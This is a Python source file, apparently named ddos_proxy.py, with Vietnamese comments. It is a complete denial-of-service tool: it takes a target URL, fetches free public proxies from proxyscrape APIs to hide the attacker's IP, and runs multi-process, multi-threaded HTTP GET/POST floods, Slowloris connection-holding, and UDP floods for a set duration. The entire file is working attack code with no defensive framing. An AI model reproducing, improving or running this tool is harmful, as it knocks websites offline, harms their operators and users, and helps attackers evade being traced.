import socket
import random
import threading
import multiprocessing
import time
import sys
import os
import ssl
import urllib.parse
import requests
import json
import socks
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# ========== CẤU HÌNH ==========
TARGET_URL = "http://target.com"
THREADS_PER_PROCESS = 200
NUM_PROCESSES = multiprocessing.cpu_count()
DURATION = 120
METHODS = ["GET", "POST", "SLOW"]   # UDP không dùng proxy, nên loại nếu sợ lộ IP
USE_PROXY = True                    # Bật proxy
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all&ssl=all&anonymity=all",
]
PROXY_FILE = "proxies.txt"          # Nếu có file, ưu tiên dùng (mỗi dòng: ip:port:type)
# =================================

# Đọc proxy từ file hoặc API
proxy_pool = []
proxy_lock = threading.Lock()

def load_proxies():
    global proxy_pool
    # Thử đọc từ file trước
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 3:
                    ip, port, typ = parts[0], int(parts[1]), parts[2]
                    proxy_pool.append({"ip": ip, "port": port, "type": typ})
                elif len(parts) == 2:
                    proxy_pool.append({"ip": parts[0], "port": int(parts[1]), "type": "http"})
        if proxy_pool:
            print(f"[+] Đã tải {len(proxy_pool)} proxy từ file.")
            return

    # Nếu không có file, gọi API
    print("[*] Đang lấy proxy từ API...")
    for url in PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=10)
            lines = resp.text.strip().split('\n')
            ptype = "http"
            if "socks4" in url: ptype = "socks4"
            elif "socks5" in url: ptype = "socks5"
            for line in lines:
                if ':' in line:
                    ip, port = line.split(':')
                    proxy_pool.append({"ip": ip, "port": int(port), "type": ptype})
        except:
            pass
    if proxy_pool:
        print(f"[+] Đã lấy {len(proxy_pool)} proxy từ API.")
    else:
        print("[!] Không có proxy, tấn công sẽ dùng IP thật. Bạn có thể thêm proxy vào file proxies.txt")

def get_proxy():
    with proxy_lock:
        if not proxy_pool:
            return None
        return random.choice(proxy_pool)

# ========== CÁC HÀM TẤN CÔNG ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

def parse_target():
    parsed = urllib.parse.urlparse(TARGET_URL)
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    scheme = parsed.scheme
    port = 443 if scheme == "https" else 80
    try:
        ip = socket.gethostbyname(host)
    except:
        ip = host
    return host, path, scheme, port, ip

def create_socket(proxy=None):
    if proxy and USE_PROXY:
        s = socks.socksocket()
        if proxy["type"] == "socks5":
            s.set_proxy(socks.SOCKS5, proxy["ip"], proxy["port"])
        elif proxy["type"] == "socks4":
            s.set_proxy(socks.SOCKS4, proxy["ip"], proxy["port"])
        else:
            s.set_proxy(socks.HTTP, proxy["ip"], proxy["port"])
        return s
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def http_flood(method="GET"):
    host, path, scheme, port, ip = parse_target()
    is_https = scheme == "https"
    end = time.time() + DURATION
    sent = 0
    while time.time() < end:
        try:
            proxy = get_proxy()
            sock = create_socket(proxy)
            sock.settimeout(3)
            if is_https:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            ua = random.choice(USER_AGENTS)
            if method == "GET":
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
            else:
                body = "x=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
                req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
            sock.send(req.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            sent += 1
        except:
            pass
    return sent

def slowloris():
    host, path, scheme, port, ip = parse_target()
    is_https = scheme == "https"
    end = time.time() + DURATION
    sent = 0
    while time.time() < end:
        try:
            proxy = get_proxy()
            sock = create_socket(proxy)
            sock.settimeout(5)
            if is_https:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            ua = random.choice(USER_AGENTS)
            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n"
            sock.send(req.encode())
            for _ in range(20):
                if time.time() >= end: break
                sock.send(b"X-Header: " + os.urandom(4).hex().encode() + b"\r\n")
                time.sleep(0.5)
            sock.close()
            sent += 1
        except:
            pass
    return sent

# UDP flood KHÔNG dùng proxy (vì UDP proxy hiếm), nhưng bạn có thể bỏ qua hoặc dùng VPN
def udp_flood():
    host, path, scheme, port, ip = parse_target()
    end = time.time() + DURATION
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end:
        try:
            payload = random._urandom(1024)
            sock.sendto(payload, (ip, port))
            sent += 1
        except:
            pass
    sock.close()
    return sent

def worker(worker_id, method):
    print(f"[Worker {worker_id}] Bắt đầu {method}...")
    if method == "GET" or method == "POST":
        with ThreadPoolExecutor(max_workers=THREADS_PER_PROCESS) as executor:
            futures = [executor.submit(http_flood, method) for _ in range(THREADS_PER_PROCESS)]
            total = sum(f.result() for f in futures)
    elif method == "SLOW":
        with ThreadPoolExecutor(max_workers=THREADS_PER_PROCESS // 2) as executor:
            futures = [executor.submit(slowloris) for _ in range(THREADS_PER_PROCESS // 2)]
            total = sum(f.result() for f in futures)
    elif method == "UDP":
        with ThreadPoolExecutor(max_workers=THREADS_PER_PROCESS) as executor:
            futures = [executor.submit(udp_flood) for _ in range(THREADS_PER_PROCESS)]
            total = sum(f.result() for f in futures)
    print(f"[Worker {worker_id}] Hoàn thành {method} - Tổng request: {total}")

def main():
    global TARGET_URL, DURATION, THREADS_PER_PROCESS, NUM_PROCESSES, USE_PROXY, METHODS
    if len(sys.argv) < 2:
        print("Usage: python ddos_proxy.py <URL> [duration] [threads_per_process] [--no-proxy]")
        print("Example: python ddos_proxy.py https://target.com 120 200")
        sys.exit(1)
    TARGET_URL = sys.argv[1]
    if len(sys.argv) > 2:
        DURATION = int(sys.argv[2])
    if len(sys.argv) > 3:
        THREADS_PER_PROCESS = int(sys.argv[3])
    if "--no-proxy" in sys.argv:
        USE_PROXY = False
        METHODS = ["GET", "POST", "UDP", "SLOW"]  # cho phép cả UDP khi không dùng proxy
    else:
        METHODS = ["GET", "POST", "SLOW"]        # bỏ UDP nếu dùng proxy (an toàn)

    if USE_PROXY:
        load_proxies()
        if not proxy_pool:
            print("[!] Không có proxy, chuyển sang chế độ không proxy.")
            USE_PROXY = False
            METHODS = ["GET", "POST", "UDP", "SLOW"]

    print(f"[+] Mục tiêu: {TARGET_URL}")
    print(f"[+] Số tiến trình: {NUM_PROCESSES}, mỗi tiến trình {THREADS_PER_PROCESS} luồng")
    print(f"[+] Thời gian: {DURATION}s")
    print(f"[+] Proxy: {'BẬT' if USE_PROXY else 'TẮT'} ({len(proxy_pool)} proxy)")
    print("[+] Phương thức:", ", ".join(METHODS))
    print("[+] Đang phát động...\n")

    with ProcessPoolExecutor(max_workers=NUM_PROCESSES) as executor:
        futures = []
        for i in range(NUM_PROCESSES):
            method = random.choice(METHODS)
            futures.append(executor.submit(worker, i, method))
        for f in futures:
            f.result()

    print("\n[+] Kết thúc tấn công.")

if __name__ == "__main__":
    main()
